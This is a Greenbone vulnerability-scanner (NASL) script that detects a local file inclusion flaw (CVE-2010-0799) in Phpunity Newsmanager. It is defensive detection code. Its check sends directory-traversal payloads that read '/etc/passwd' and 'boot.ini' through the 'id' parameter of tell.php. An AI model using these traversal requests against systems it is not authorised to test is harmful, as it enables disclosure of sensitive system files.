# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800484");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2010-03-10 15:48:25 +0100 (Wed, 10 Mar 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2010-0799");
  script_name("Phpunity Newsmanager Local File Inclusion Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/38409");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/11290");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/1001-exploits/phpunity-lfi.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"affected", value:"Phpunity.Newsmanager");

  script_tag(name:"insight", value:"Input passed to the 'id' parameter in 'misc/tell_a_friend/tell.php' is not
  properly verified before being used to read files. This can be exploited to
  partially disclose content of arbitrary files via directory traversal attacks
  and URL-encoded NULL bytes.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Phpunity Newsmanager is prone to local file inclusion vulnerability.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to disclose potentially sensitive
  information.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list_unique("/phpunity.newsmanager", "/Phpunity_Newsmanager" , http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  req = http_get(item: dir + "/tmpl/news_main.htm", port:port);
  res = http_keepalive_send_recv(port:port, data:req);
  if((":: phpunity.newsmanager ::" >< res))
  {
    req = http_get(item:string(dir, "/misc/tell_a_friend/tell.php?id=" +
                          "../../../../../../../etc/passwd"), port:port);
    res = http_keepalive_send_recv(port:port, data:req);
    if(":daemon:/sbin:/sbin/" >< res)
    {
      security_message(port:port);
      exit(0);
    }

    req = http_get(item:string(dir, "/misc/tell_a_friend/tell.php?id=" +
                          "../../../../../../../boot.ini"), port:port);
    res = http_keepalive_send_recv(port:port, data:req);
    if("\WINDOWS" >< res || "operating systems" >< res || "partition" >< res)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
